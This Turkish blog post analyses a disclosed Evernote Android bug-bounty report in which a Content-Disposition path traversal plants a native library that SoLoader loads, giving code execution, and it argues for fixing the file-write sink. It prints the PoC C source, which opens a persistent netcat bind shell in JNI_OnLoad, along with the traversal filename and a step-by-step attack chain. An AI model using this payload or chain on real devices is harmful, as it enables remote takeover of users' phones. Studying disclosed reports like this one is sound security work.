# Bug Bounty Rapor Analizi : 2 click Remote Code execution in Evernote Android
![](/blogs/img/everNote/1.png)
Bug bounty sürecinde, bir zafiyetin giderildiği bildirildikten sonra aynı etkiye farklı bir root cause üzerinden yeniden ulaşılabildiği durumlar yaşanır. Bu, uygulamadaki attack surface'in tam olarak güvenli hale getirilmediğinin ve fix'in sadece belirli bir entry point'i kapattığının göstergesidir.
 
Bu yazıda tam olarak böyle bir senaryoyu inceleyeceğiz: hulkvision_ tarafından HackerOne platformunda Evernote'a raporlanan ve path traversal zafiyetinin native library hijacking üzerinden remote code execution (RCE) ile sonuçlandığı bu bulguyu, teknik derinliğiyle birlikte inceleyeceğiz. Sadece raporu analiz etmekle kalmayacak, araştırmacının raporda "Hermes bytecode yüzünden gösteremiyorum" dediği zafiyetli kısmı reverse ederek bulup inceleyeceğiz.
 
## Temel Kavramlar
 
Bu analizde sıkça karşılaşacağınız kavramları önce açıklayalım.
 
**Path Traversal:** Bir uygulamanın dosya sistemi üzerinde dosya okuma veya yazma işlemi yaparken, dosya yolundaki `../` (bir üst dizine çık) gibi özel karakterleri temizlememesi sonucu ortaya çıkan bir zafiyet türüdür. Normalde bir uygulama dosyaları yalnızca kendi belirlediği klasöre yazar — örneğin `/data/data/com.evernote/cache/`. Ancak dosya adı `../../../başka-klasör/dosya.txt` gibi bir şey içeriyorsa, uygulama farkında olmadan o güvenli klasörün çok dışına, tamamen farklı bir lokasyona dosya yazabilir.
 
**Remote Code Execution (RCE):** Bir saldırganın, hedef cihazda kendi yazdığı kodu uzaktan çalıştırabilmesidir. Bu, güvenlik zafiyetlerinin en kritik sonuçlarından biridir çünkü saldırgan artık sadece veri okumak veya değiştirmekle kalmaz — cihaz üzerinde istediği işlemi yapabilir hale gelir.
 
**Native Library (.so dosyaları):** Android uygulamaları normalde Java veya Kotlin ile yazılır ve Android Runtime (ART) üzerinde çalışır. Ancak bazı durumlarda — performans gerektiren grafik işlemleri, kriptografi, veya platform seviyesinde erişim gibi — uygulamalar C/C++ ile yazılmış "native" kod kullanır. Bu native kod, `.so` (shared object) uzantılı dosyalarda derlenir ve uygulama çalışırken belleğe yüklenir.
 
**Content-Disposition Header:** Bir web sunucusu tarayıcıya veya uygulamaya dosya gönderirken, HTTP response'un header kısmında `Content-Disposition` adlı bir alan bulunabilir. Bu alan, dosyanın adını ve nasıl işlenmesi gerektiğini belirtir. Örneğin `Content-Disposition: attachment; filename="rapor.pdf"` header'ı, "bu bir ek dosyadır ve adı rapor.pdf'dir" der. Uygulama bu header'ı okuyup dosyayı o isimle kaydeder — eğer filename değerini kontrol etmeden kullanırsa, path traversal'a kapı açılır.
 
**Sanitization:** Kullanıcıdan veya dış kaynaklardan gelen verilerin, zararlı içerik barındırıp barındırmadığının kontrol edilmesi ve tehlikeli kısımların temizlenmesi işlemidir. Örneğin bir dosya adındaki `../` ifadelerinin silinmesi veya sadece alfanumerik karakterlere izin verilmesi bir sanitization işlemidir. Bu yazıdaki zafiyetin temel sebebi, sanitization eksikliğidir.
 
**Hermes Bytecode:** React Native uygulamalarında JavaScript kodu normalde düz text olarak paketlenir. Ancak Meta'nın geliştirdiği Hermes engine, bu JavaScript kodunu çalıştırmadan önce bytecode'a derler — tıpkı C kodunun gcc ile .exe dosyasına derlenmesi gibi. Amaç kodu gizlemek (obfuscation) değil, uygulamanın daha hızlı açılmasını sağlamaktır; ama ana etki olarak kod okunmaz hale gelir. Hermes bytecode dosyaları `c61f bc03` magic bytes'ı ile başlar ve xxd ile açıldığında şöyle görünür:
 
```
c61f bc03 0000 0000 0012 0000 a845 0100
0038 0000 7844 0100 3001 0000 0000 0000
```
 
Bu okunamaz çünkü artık text değil, binary instruction'lardır. `hbctool` gibi araçlarla disassemble edilebilir — yani makine talimatları insanın okuyabileceği (ama hâlâ düşük seviyeli) bir formata çevrilir. Bu yazının ilerleyen bölümlerinde Hermes bytecode'u nasıl disassemble edip zafiyetli kodu bulduğumuzu detaylıca göreceğiz.
 
**Smali:** Android uygulamalarının Java/Kotlin kodu, APK içinde `.dex` (Dalvik Executable) formatında saklanır. Smali, bu `.dex` bytecode'unun insan tarafından okunabilir assembly dilidir. JADX gibi araçlar `.dex`'i yüksek seviyeli Java koduna geri çevirmeye çalışır ama bazen başarısız olur. Smali ise bytecode'un birebir okunabilir karşılığı olduğu için her zaman eksiksiz çalışır — daha düşük seviyeli ve daha zor okunur, ama güvenilirdir.
 
## Arka Plan: Fix the Input vs Fix the Sink
 
Bu raporun hikayesini anlamak için önce ilk raporla arasındaki ilişkiyi ve Evernote'un yaptığı fix'in neden yetersiz kaldığını kavramak gerekiyor.
 
Bir veri akışını iki uçtan ele alabiliriz: veriyi üreten veya ileten kaynak **input**, veriyi tüketip bir işlem yapan nokta ise **sink** olarak adlandırılır. Bir dosya indirme senaryosunda input, dosya adının geldiği kaynak (bir HTTP header, bir veritabanı alanı, bir content provider vb.); sink ise bu dosya adını alıp dosya sistemine yazan koddur.
 
İlk raporda araştırmacı şunu bulmuştu: Evernote Android uygulaması, Android'in `content://` URI mekanizması üzerinden gelen dosya sağlayıcısının (content provider) `_display_name` değerini sanitize etmiyordu. Android'de uygulamalar arasında dosya paylaşımı doğrudan dosya yolu vererek yapılmaz; bunun yerine, dosyayı paylaşan uygulama bir "content provider" sunar ve diğer uygulamalar `content://` ile başlayan bir URI üzerinden bu dosyaya erişir. Content provider, dosya hakkında meta-data sağlar — dosya adı (`_display_name`), boyutu, MIME tipi gibi. İlk rapordaki zafiyet, bu meta-data'daki dosya adının sanitize edilmeden file path oluşturmada kullanılmasıydı.
 
Evernote bu zafiyeti fix etti — ama fix nereye uygulandı?
 
Evernote'un yaklaşımı "fix the input" stratejisiydi: sadece content provider'dan gelen `_display_name` input'unu sanitize ettiler. Ancak asıl sorunlu nokta — yani dosya yazma işlemini yapan downstream logic (sink) — dokunulmadan kaldı.
 
İkinci raporda araştırmacı tam da bu açığı kullandı. Aynı sink'e farklı bir input üzerinden ulaştı: bu sefer veri, content provider yerine HTTP response'taki `Content-Disposition` header'ından geliyordu.
 
Bu pattern, bize temel bir dersi gösteriyor: "fix the input" yaklaşımı, gözden kaçan mevcut input'lar olduğunda kırılmaya mahkumdur. Doğru yaklaşım "fix the sink" — yani dosya yazma logic'inin kendisinde, gelen filename ne olursa olsun `../` sequence'larını strip etmek veya filename'i tamamen yeniden oluşturmaktır.
 
## Uygulama Mimarisi: React Native & Katmanlı Yapı
 
Evernote Android uygulaması hibrit bir yapıya sahip: bazı bölümler Java ile yazılmış (native Android), bazı bölümler ise React Native ile yazılmıştır.
 
Source code incelediğimizde Evernote'un dosya indirme mimarisinde beş katman iç içe çalıştığını görürüz:
 
```
Evernote JavaScript kodu (Hermes bytecode)
    ↓ "bu URL'den dosya indir, şu path'e kaydet"
rn-fetch-blob JavaScript modülü (Hermes bytecode)
    ↓ Content-Disposition header'ından filename'i parse eder, path oluşturur
rn-fetch-blob Java modülü (g.smali — zafiyetli dosya yazma kodu)
    ↓ path'i alır, OkHttp3'e HTTP isteği yaptırır, gelen veriyi dosyaya yazar
OkHttp3 kütüphanesi
    ↓ gerçek HTTP bağlantısını kurar, request gönderir, response alır
Evernote sunucusu
    ↓ Content-Disposition header'ı ile dosyayı gönderir
```
 
Burada **rn-fetch-blob**, React Native uygulamalarında dosya indirme işlemleri için kullanılan popüler bir üçüncü parti modüldür. **OkHttp3** ise Android dünyasının en yaygın HTTP client kütüphanesidir — rn-fetch-blob'un Java tarafı, gerçek HTTP bağlantılarını kurmak için OkHttp3'ü kullanır. Yani OkHttp3 sadece "sunucudan veriyi getiren kurye" rolündedir; zafiyet kurye'de değil, path oluşturma ve dosya yazma katmanlarındadır.
 
Zafiyetin bulunduğu attachment download logic'i React Native tarafında yer alıyor ve Hermes bytecode'a compile edilmiş durumdadır.
 
## Zafiyet Detayı: Content-Disposition Header'dan Path Traversal
 
Evernote'ta bir note'a attachment eklenebilir ve bu attachment'lar diğer kullanıcılarla paylaşılabilir. Normal akışta, bir kullanıcı attachment'a tıkladığında dosya şu path'e indirilir:
 
```
/data/data/com.evernote/cache/preview/<UUID>/
```
 
Bu, uygulamanın sandbox'ı içinde güvenli bir konumdur. Ancak araştırmacı, Evernote'un attachment rename özelliğinde bir sanitization eksikliği keşfetti. Bir dosya şu şekilde yeniden adlandırılabiliyordu:
 
```
Orijinal filename:  libjnigraphics.so
Yeni filename:      ../../../lib-1/libjnigraphics.so
```
 
Bu rename işleminden sonra, dosya sunucudan indirildiğinde HTTP response'taki Content-Disposition header'ı da bu yeni adı yansıtıyordu:
 
```
Content-Disposition: attachment; filename="../../../lib-1/libjnigraphics.so"
```
 
Uygulamanın indirme logic'i bu filename'i sanitize etmeden path'e birleştiriyordu:
 
```
indirme_yolu = "/data/data/com.evernote/cache/preview/<UUID>/" + filename
```
 
`../` ifadeleri dosya sisteminde "bir üst dizine çık" anlamına geldiğinden, sonuç path'i normalize edildiğinde şu hale geliyordu:
 
```
/data/data/com.evernote/lib-1/libjnigraphics.so
```
 
Böylece dosya, cache directory'si yerine uygulamanın native library arama dizinine yazılmış oluyordu.
 
## SoLoader: Path Traversal'dan Code Execution'a
 
Path traversal tek başına bir arbitrary file write primitive'idir — saldırgana istediği konuma dosya yazma yeteneği verir, ama tek başına code execution anlamına gelmez. Yazılan dosyanın, uygulama tarafından "çalıştırılabilir kod" olarak yüklenen bir konuma düşmesi gerekir.
 
SoLoader, React Native uygulamalarında kullanılan bir native library loader'dır. Bir native library'yi yüklemesi istendiğinde, belirli bir sırayla birden fazla dizini kontrol eder:
 
1. `/data/data/<package>/lib-1/` — birincil arama dizini (en yüksek priority)
2. `/data/data/<package>/lib-main/` — ana library dizini
3. System library path — `/system/lib64/` veya `/system/lib/`
 
`libjnigraphics.so`, normalde `/system/lib64/` dizininde bulunan bir Android platform library'sidir. Evernote bu library'yi yüklemek istediğinde SoLoader önce `lib-1/`'e bakar. Normalde bu dizin boştur, bu yüzden SoLoader system path'teki meşru library'yi yükler.
 
Ancak saldırgan path traversal ile kendi malicious `libjnigraphics.so` dosyasını `lib-1/` dizinine yerleştirdiğinde, SoLoader onu system library'den önce bulur ve yükler.
 
Rapordaki logcat çıktıları bu mekanizmayı doğruluyor.
![](/blogs/img/everNote/2.png)

## JNI_OnLoad Payload Analizi
 
Araştırmacının hazırladığı PoC native library'nin source code'u:
 
```c
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    if (fork() == 0) {
        system("toybox nc -p 6666 -L /system/bin/sh -l");
    }
    JNIEnv* env;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }
    return JNI_VERSION_1_6;
}
```
 
**JNI_OnLoad:** Native library belleğe yüklendiğinde JVM otomatik olarak bu fonksiyonu çağırır. Code execution, library yüklenir yüklenmez — herhangi bir fonksiyon çağrısı beklenmeden — gerçekleşir.
 
**fork():** Mevcut process'in birebir kopyasını oluşturur. `fork()` child process'te 0 döndürür, bu yüzden `if (fork() == 0)` bloğundaki malicious kod sadece child'da çalışır. Parent process (Evernote) normal devam eder, kullanıcı anomali fark etmez. JNI_OnLoad'ın geri kalanı parent'ta sorunsuz tamamlanır, SoLoader yüklemenin başarılı olduğunu düşünür.
 
**toybox nc -p 6666 -L /system/bin/sh -l:** toybox Android'in yerleşik Unix araç koleksiyonudur, ek binary yüklemeye gerek yoktur. nc (netcat) 6666 portunda listener açar, bağlanan herkese shell verir. `-L` flag'i listener'ı persistent yapar.
 
**Neden libjnigraphics.so?** Evernote bu library'yi runtime'da SoLoader üzerinden yüklüyor ama `lib-1/` dizininde mevcut değil. Araştırmacı var olan bir dosyayı overwrite etmek yerine boş bir dizine yazıyor.
 
## Reverse Engineering
 
Araştırmacı raporda "attachment download logic'i React Native tarafında ve Hermes bytecode'a compile edilmiş, bu yüzden zafiyetli kodu gösteremiyorum" demişti. Ben de bu bariyeri aşarak zafiyetli kodu görmek istediğimden kodu bulmaya çalıştım.
 
### Adım 1 — Hermes Bytecode
 
APK'nın `assets/` klasöründe `index.android.bundle` dosyasını bulunuyor. `xxd` ile ilk byte'larına baktığımızda `c61f bc03` magic bytes'ını görüyoruz — bu, dosyanın okunabilir JavaScript değil Hermes bytecode olduğunu kanıtlar. Eğer dosyayı herhangi bir text editörle açsarsak anlamlandıramadığımız binary veri görürüz.
 
### Adım 2 — hbctool ile Disassemble
 
`hbctool disasm index.android.bundle output_hasm` komutuyla bytecode'u disassemble edebiliriz. Bu komutun yaptığı iş, Ghidra'nın bir C binary'sini disassemble etmesiyle aynı mantıktır: binary'deki makine talimatlarını insanın okuyabileceği (ama hâlâ düşük seviyeli) bir formata çevirir.
 
Üç dosya oluştu:
 
- **instruction.hasm** — tüm fonksiyonların Hermes assembly komutları
- **string.json** — kodda kullanılan tüm text string'ler
- **metadata.json** — fonksiyon bilgileri
 
### Adım 3 — String'lerden İpucu Arama
 
Hermes bytecode'u doğrudan okuyamıyor olsak da, içindeki string'ler hâlâ düz text olarak durur — çünkü program çalışırken bu string'leri aynen kullanmak zorundadır.
 
string.json'da arama yaptığımızda şu kritik bulguları elde ettik:
![](/blogs/img/everNote/3.png)
 
Bu bize iki şey söyledi: Evernote dosya indirme için rn-fetch-blob kütüphanesini kullanıyor, ve kodda content-disposition header'ı referans ediliyor.
 
### Adım 4 — Response Handling Kodunu Bulma
 
`respInfo` string'ini `instruction.hasm`'da aradığımızda, 2706182. satır civarında yoğun kullanıldığını gördük. O bölgeyi incelediğimizde rn-fetch-blob'un response'u işlediği ana kodu bulduk — respInfo → headers → Content-Encoding, Content-Length, Transfer-Encoding gibi header'lar okunuyordu.
 
Burada önemli bir keşif yaptık: `Content-Disposition` string'inin büyük harfli versiyonu string.json'da yoktu. Diğer response header'ları büyük harfle yazılmışken (Content-Encoding, Content-Length), Content-Disposition sadece küçük harfle mevcuttu. Bu, Content-Disposition header parsing'inin Java tarafında değil, tamamen JavaScript tarafında yapıldığını gösterdi — araştırmacının söylediği Hermes bariyerini doğruladı.
 
Bu noktada şu soruyu sormalıyız: React Native'de JavaScript kodları native (Java) fonksiyonları doğrudan çağıramaz; peki dosya nasıl yazıyor?
 
İşte burada araya **Bridge** giriyor. Bridge, JavaScript dünyası ile Java dünyası arasında mesaj taşıyan bir tercüman gibidir. Uygulamanın kullandığı rn-fetch-blob modülü de tam olarak bu köprünün iki yakasında çalışan iki parçadan oluşur:
 
**JavaScript tarafı** (Hermes bytecode içinde) — Content-Disposition header'ını parse eder, filename'i çıkarır, base path ile birleştirip tam path'i oluşturur. Sonra bridge üzerinden Java tarafına şunu der: "şu path'e, şu URL'den dosya indir."
 
**Java tarafı** (g.smali / g.java) — JavaScript'ten gelen bu mesajı alır. Path string'i constructor'ın p2 parametresi olarak gelir ve `this.b`'ye yazılır. Sonra OkHttp3 ile HTTP isteği yapar ve dosyayı o path'e yazar.
 
Bridge üzerinden geçiş teknik olarak şöyle oluyor: JavaScript tarafı `RNFetchBlob.fetch()` gibi bir fonksiyon çağırır. React Native bridge bu çağrıyı yakalar, parametreleri (path, URL, headers vb.) serialize eder (JSON benzeri bir formata çevirir) ve Java tarafındaki karşılık gelen native modüle iletir. Java tarafında `g` sınıfının constructor'ı bu parametrelerle çağrılır — p2 (path) bu şekilde JavaScript'ten Java'ya ulaşır.
 
Bunu Smali Kodunda da görebiliriz:
 
```smali
new-instance p3, Lcom/RNFetchBlob/b;
invoke-direct {p3, p1}, Lcom/RNFetchBlob/b;-><init>(Lcom/facebook/react/bridge/ReadableMap;)V
iput-object p2, p0, Lcom/RNFetchBlob/g;->b:Ljava/lang/String;
```
 
p1 parametresi `ReadableMap` tipinde — bu, React Native bridge'in JavaScript'ten Java'ya veri taşımak için kullandığı özel bir veri yapısıdır. ReadableMap'in burada olması, bu constructor'ın JavaScript tarafından bridge üzerinden çağrıldığının kesin kanıtıdır.
 
p2 ise path string'i — JavaScript tarafı Content-Disposition header'ından çıkardığı filename'i base path ile birleştirip bu parametreye koyuyor.
 
Yani akış kısaca: sunucu filename'i gönderir → JavaScript parse eder ve path oluşturur → bridge path'i Java'ya taşır → Java dosyayı o path'e yazar.
 
### Adım 5 — Java Tarafına Geçiş: JADX
 
APK'yı JADX ile decompile edip `com/RNFetchBlob/` paketindeki Java dosyalarını inceledik. `g.java` (852 satır) ana response handling dosyasıydı. Ancak JADX, kritik response handling metodunu decompile edemedi: "Method not decompiled" hatası verdi. JADX karmaşık kontrol akışlarında bazen başarısız olur.
 
### Adım 6 — Smali ile Zafiyetli Sink'i Bulma
 
JADX başarısız olunca apktool ile smali koduna geçtik. Smali, bytecode'un birebir okunabilir karşılığı olduğu için her zaman eksiksiz çalışır. `g.smali` dosyasında `FileOutputStream` referanslarını aradık ve satır 1100-1170 arasında zafiyetli dosya yazma kodunu buldum.
 
Aşağıdaki smali kodunu javaya çevirerek açıklamaya çalışalım:
 
**Kontrol: Bu dosya diske kaydedilmeli mi?**
 
```smali
iget-object v0, p0, Lcom/RNFetchBlob/g;->a:Lcom/RNFetchBlob/b;
iget-object v0, v0, Lcom/RNFetchBlob/b;->h:Ljava/lang/Boolean;
invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z
move-result v0
if-eqz v0, :cond_4
```
 
```java
Boolean shouldSave = this.a.h;
if (!shouldSave.booleanValue()) {
    return; // Kaydedilmeyecekse işlemi atla
}
```
 
`this.a` bir `RNFetchBlob/b` sınıfı (konfigürasyon objesi), `h` field'ı "dosya diske kaydedilsin mi?" ayarını tutuyor. Eğer false ise fonksiyon burada bitiyor, dosya yazma işlemi yapılmıyor.
 
**Dosya yolu:**
 
```smali
iget-object v0, p0, Lcom/RNFetchBlob/g;->b:Ljava/lang/String;
invoke-static {v0}, Lcom/RNFetchBlob/d;->a(Ljava/lang/String;)Ljava/lang/String;
move-result-object v0
```
 
```java
String filePath = RNFetchBlobUtils.normalizePath(this.b);
```
 
`this.b`, dosyanın yazılacağı tam path'i tutan string'dir. Bu path, React Native bridge üzerinden JavaScript tarafından sağlanır. `d.a()` metodu path'i "normalize" ediyor — ancak bu normalization sadece `RNFetchBlob-file://` gibi özel prefix'leri temizler, `../` sequence'larını kontrol etmez. Yani `../../../lib-1/libjnigraphics.so` içeren bir path bu noktadan olduğu gibi geçer. İşte zafiyet tam burada: JavaScript tarafı Content-Disposition header'ından gelen filename'i sanitize etmeden base path'e birleştirip bu field'a yazıyor, Java tarafı da gelen path'i kontrol etmeden kullanıyor.
 
**Response body'den veri akışını alma:**
 
```smali
invoke-virtual {p1}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
move-result-object v1
invoke-virtual {v1}, Lokhttp3/ResponseBody;->byteStream()Ljava/io/InputStream;
move-result-object v1
```
 
```java
InputStream inputStream = response.body().byteStream();
```
 
p1 parametresi OkHttp3'ün Response objesidir. OkHttp3, rn-fetch-blob'un HTTP bağlantılarını kurmak için kullandığı alt katman kütüphanesidir — sunucudan gelen veriyi taşıyan "kurye" rolündedir. `response.body().byteStream()` sunucudan gelen dosya verisini bir byte akışı olarak açar.
 
**Dosya oluşturma ve yazma akışını açma:**
 
```smali
new-instance v3, Ljava/io/FileOutputStream;
new-instance v4, Ljava/io/File;
invoke-direct {v4, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V
invoke-direct {v3, v4}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
```
 
```java
File file = new File(filePath);
FileOutputStream outputStream = new FileOutputStream(file);
```
 
İşte tam burası zafiyetin sink noktası. v0 register'ındaki path string'i — ki içinde `../../../lib-1/libjnigraphics.so` olabilir — hiçbir kontrol yapılmadan doğrudan `new File()` ile kullanılıyor. `../` kontrolü yok, `File.getCanonicalPath()` ile hedef dizin doğrulaması yok, filename'in yeniden oluşturulması yok. Java, bu path'i aynen kabul edip dosya sisteminde o konuma dosya oluşturuyor.
 
**Dosya yazma döngüsü:**
 
```smali
const/16 v4, 0x2800          ; 0x2800 = 10240 byte = 10 KB buffer
new-array v4, v4, [B          ; byte[] buffer = new byte[10240]
:goto_0                        ; döngü başlangıcı
invoke-virtual {v1, v4}, Ljava/io/InputStream;->read([B)I
move-result v10                ; bytesRead = inputStream.read(buffer)
const/4 v11, -0x1
if-eq v10, v11, :cond_3       ; if (bytesRead == -1) break → veri bitti
invoke-virtual {v3, v4, v7, v10}, Ljava/io/FileOutputStream;->write([BII)V
goto :goto_0                   ; döngünün başına dön
```
 
```java
byte[] buffer = new byte[10240]; // 10 KB'lık arabellek
int bytesRead;
while ((bytesRead = inputStream.read(buffer)) != -1) {
    outputStream.write(buffer, 0, bytesRead);
}
```
 
Sunucudan gelen veri 10 KB'lık parçalar halinde okunup dosyaya yazılıyor. `0x2800` hex değeri = 10240 decimal = 10 KB. `-1` dönmesi verinin bittiği anlamına gelir ve döngü sona erer.
 
**Temizlik ve kapatma:**
 
```smali
invoke-virtual {v1}, Ljava/io/InputStream;->close()V     ; inputStream.close()
invoke-virtual {v3}, Ljava/io/FileOutputStream;->flush()V ; outputStream.flush()
invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V ; outputStream.close()
iget-object v1, p0, Lcom/RNFetchBlob/g;->i:Lcom/facebook/react/bridge/Callback;
```
 
```java
inputStream.close();
outputStream.flush();
outputStream.close();
Callback callback = this.i; // React Native'e "işlem bitti" bildirimi
```
 
Veri akışları kapatılıyor ve React Native tarafına callback ile "indirme tamamlandı" bildirimi gönderiliyor. Bu noktada dosya artık diske yazılmış durumda — ve eğer path `../../../lib-1/libjnigraphics.so` içeriyorsa, dosya `lib-1/` dizinine yazılmış olur.
 
### Adım 7 — Path'in Kaynağını Takip Etme
 
`this.b`'nin nereden geldiğini bulmak için smali'de ararız ve constructor'da p2 parametresinden set edildiğini görürüz:
 
```smali
iput-object p2, p0, Lcom/RNFetchBlob/g;->b:Ljava/lang/String;
```
 
p2, constructor'ın ikinci parametresidir ve React Native bridge üzerinden JavaScript tarafından sağlanır. Aynı constructor'da `ReadableMap`, `Callback` gibi React Native bridge tipleri de parametre olarak alınıyor — bu, fonksiyonun JavaScript'ten çağrıldığını doğruluyor.
 
## Attack Chain
 
**Adım 1 — Malicious library hazırlama:** Saldırgan, JNI_OnLoad payload'unu içeren bir ARM64 native library derliyor ve `libjnigraphics.so` olarak adlandırıyor.
 
**Adım 2 — Note'a ekleme:** Bu `.so` dosyası bir Evernote note'una attachment olarak ekleniyor.
 
**Adım 3 — Path traversal ile rename:** Attachment, `../../../lib-1/libjnigraphics.so` olarak yeniden adlandırılıyor. Evernote dosya adında özel karakter kontrolü yapmadığı için bunu kabul ediyor.
 
**Adım 4 — Victim'e gönderme:** Note, victim ile paylaşılıyor (invitation veya internal link ile).
 
**Adım 5–1. Click:** Victim linke tıklayarak note'u açıyor.
 
**Adım 6–2. Click:** Victim attachment'a tıklıyor. Uygulama dosyayı indiriyor ve Content-Disposition header'ındaki path traversal payload'u nedeniyle dosya `lib-1/` dizinine yazılıyor. Kullanıcıya "bu dosya türünü açacak uygulama bulunamadı" mesajı gösterilebilir — ama dosya arka planda zaten yazılmıştır.
 
**Adım 7 — Code execution:** Victim uygulamayı kapatıp yeniden açtığında, SoLoader `lib-1/` dizininde saldırganın library'sini bulur, yükler, JNI_OnLoad tetiklenir ve reverse shell aktif hale gelir.
 
## Persistence
 
Bu exploit'in en tehlikeli yönlerinden biri kalıcılık sağlamasıdır. Native library bir kez `lib-1/` dizinine yazıldıktan sonra, uygulama her başlatıldığında SoLoader bu library'yi yükler ve malicious kod yeniden çalışır. Bir kez tıklamak yeterlidir — bundan sonra her uygulama açılışında saldırganın kodu otomatik çalışır.
 
**Görünmezlik:** `/data/data/com.evernote/lib-1/` dizini root erişimi olmadan görüntülenemez. Uygulama normal çalıştığı için kullanıcıda şüphe uyandırmaz.
 
**Güncelleme dayanıklılığı:** Uygulama güncellemelerinde `lib-main/` dizini yeniden extract edilir, ancak `lib-1/` gibi SoLoader-specific dizinlerin temizlenip temizlenmeyeceği konfigürasyona bağlıdır. Persistence'ı kesin sonlandıran işlem: uygulamanın tamamen kaldırılıp yeniden yüklenmesi veya verilerin temizlenmesidir.
 
**Detection zorluğu:** Root erişimi ile `lib-1/` dizinini kontrol etmek, `adb logcat` ile SoLoader log'larını izlemek, veya network traffic'te beklenmeyen bağlantıları aramak (port 6666) mümkün olsa da, bunlar bir kullanıcının yapacağı şeyler değildir.
 
## Sonuç: Fix the Sink, Not Just the Input
 
Bu rapor, bize temel bir prensibi somut bir örnekle gösteriyor. Evernote, ilk rapordaki content provider input'unu sanitize ederek zafiyeti kapattığını düşündü. Ancak asıl sorun olan file write sink'i dokunulmadan kaldı. Araştırmacı aynı sink'e farklı bir input (Content-Disposition header) üzerinden ulaşarak aynı impact'i yeniden elde etti.
 
Reverse sürecinde bu sink'i smali seviyesinde bulduk ve kanıtladık: `g.smali`'deki `new File(path)` çağrısı, JavaScript tarafından gelen path'i hiçbir kontrol yapmadan dosya sistemine yazıyor. Doğru fix, bu noktada `../` sequence'larını strip etmek veya gelen filename'i tamamen ignore edip UUID-based naming kullanmaktır.
 
Bu analiz, hulkvision_ tarafından HackerOne üzerinden raporlanan ve kamuya açıklanan Evernote güvenlik raporuna dayanmaktadır. Orijinal rapora HackerOne'daki sayfasından ulaşabilirsiniz: [https://hackerone.com/reports/3475626](https://hackerone.com/reports/3475626)
 